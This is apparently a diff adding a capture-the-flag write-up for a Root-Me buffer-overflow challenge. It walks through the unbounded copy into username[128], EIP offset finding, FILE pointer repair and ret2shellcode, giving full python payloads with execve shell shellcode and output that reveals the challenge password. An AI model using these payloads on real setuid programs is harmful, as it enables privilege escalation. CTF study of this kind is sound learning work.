@@ -1,0 +1,138 @@
+
+=============================================================================================
+Exploit Layout
+=============================================================================================
+
+|------------------------------------------------------------------------------------|
+| SHELLCODE | "A" * (136-27) | libc_fgets FILE pointer | "C" * 28 | EIP -> SHELLCODE |
+|------------------------------------------------------------------------------------|
+  33 bytes    (136-33) bytes         4 bytes             28 bytes      4 bytes
+
+
+
+
+Program Flow
+
+=============================================================================================
+1. Vulnerable Code
+=============================================================================================
+
+
+BUFFER 512
+
+
+// file stream can put a total of 512 bytes into char buff[BUFFER+1].
+// after the strncmp(); cpstr() copies all of it into char username[128].
+// since it's 128 bytes, and cpstr has no boundry checks, user can overflow.
+
+  while(fgets(buff, BUFFER, file) != NULL)
+    {
+      chomp(buff);
+      if(strncmp(buff, "USERNAME=", 9) == 0)
+        {
+          cpstr(init.username, buff+9);
+        }
+    }
+
+// No boundries check from copying from *src to *dst.
+void cpstr(char *dst, const char *src)
+{
+  for(; *src; src++, dst++)
+    {
+      *dst = *src;
+    }
+  *dst = 0;
+}
+
+
+
+=============================================================================================
+2. EIP/ESI Overflow
+=============================================================================================
+
+
+- The program takes a *.conf. strncmp() makes sure it starts with "USERNAME=" or 
+  else it exits.
+- Remember we can overflow username[128]
+
+# python -c 'print "USERNAME=" > /tmp/x
+# python -c 'print "USERNAME=" + "A" * 200 > /tmp/x
+
+// Found location of EIP overflow with pattern_create & pattern_offset.
+# python -c 'print "USERNAME=" + "A" * 136 + "B" * 4 > /tmp/x
+
+
+
+=============================================================================================
+3. FILE POINTER Location
+=============================================================================================
+
+
+We crash upon return to Init; this is because our file pointer is at an unknown location 
+and it wasn't returned to with the username[128] buff. After we return the pointer to its
+proper location 0x804d1a0. This allows fixes the crash.
+
+ltrace ./ch10 x
+__libc_start_main(0x804938b, 2, 0xffffd2b4, 0x8049440 <unfinished ...>
+fopen("x", "r")                                          = 0x804d1a0 <----FILE POINTER
+memset(0xffffd014, '\0', 136)                            = 0xffffd014
+getpid()                                                 = 115067
+getuid()                                                 = 0
+fgets("USERNAME=AAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0x804d1a0) = 0xffffce13 <----FILE POINTER
+
+
+
+=============================================================================================
+4. 2nd EIP Overflow
+=============================================================================================
+
+
+- Using pattern_create & pattern_offset found the location of 2nd EIP overflow.
+
+# python -c 'print "USERNAME=" + "A" * 136 + "\xa0\xd1\x04\x08" + "C" * 32' > x4
+# python -c 'print "USERNAME=" + "A" * 136 + "\xa0\xd1\x04\x08" + "C" * 28 + "B" * 4' > x4
+
+
+=============================================================================================
+5. Ret2Shellcode
+=============================================================================================
+
+
+2nd EIP has the address of shellcode location, which was placed at the start of "A" buff.
+
+
+# Landing on NOP Sled Confirmed
+python -c 'print "USERNAME=" + "\x90" * 27 + "A" * (136-27) + "\xa0\xd1\x04\x08" + "C" * 28 + "\xe9\xd2\x04\x08"' > x4
+
+
+# Local FLAG (Shellcode fails on Remote)
+python -c 'print "USERNAME=" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * (136-21) + "\xa0\xd1\x04\x08" + "C" * 28 + "\xe9\xd2\x04\x08"' > x4
+
+# ROOT-ME FLAG w/ SHELLCODE
+python -c 'print "USERNAME=" + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A" * (136-33) + "\x60\xb1\x04\x08" + "C" * 28 + "\xc9\xb2\x04\x08"' > /tmp/x
+
+
+app-systeme-ch10@challenge02:/tmp$ /challenge/app-systeme/ch10/./ch10 /tmp/x
+bash-4.4$ id
+uid=1110(app-systeme-ch10) gid=1110(app-systeme-ch10) euid=1210(app-systeme-ch10-cracked) groups=1110(app-systeme-ch10),100(users)
+bash-4.4$ cat /challenge/app-systeme/ch10/.passwd
+h8Q!2)3=9"51
+bash-4.4$
+
++ http://shell-storm.org/shellcode/files/shellcode-606.php
++ referenced shellcode allows for elevated privs. (/bin/bash)
++ 'python import pty;pty.spawn("/bin/bash")' will allow elevated privs.
+- some (/bin/dash) + (/bin/sh) shellcodes failed.
+
+=============================================================================================
+EXTRA:
+=============================================================================================
+
+
+- scp r.sh to root-me/tmp/r.sh and use that for differencing addresses.
+- QUESTION: While in different directories, why does the *fp point to a different location
+                        in the "A" buff AFTER it's finished with fopen()?
+
+                - SUCCESS: user location in /tmp while executing /challenge/app-systeme/ch10/./ch10
+                - FAIL: user location in /challenge/app-systeme/ch10/ and executes there.
+                - WHY?
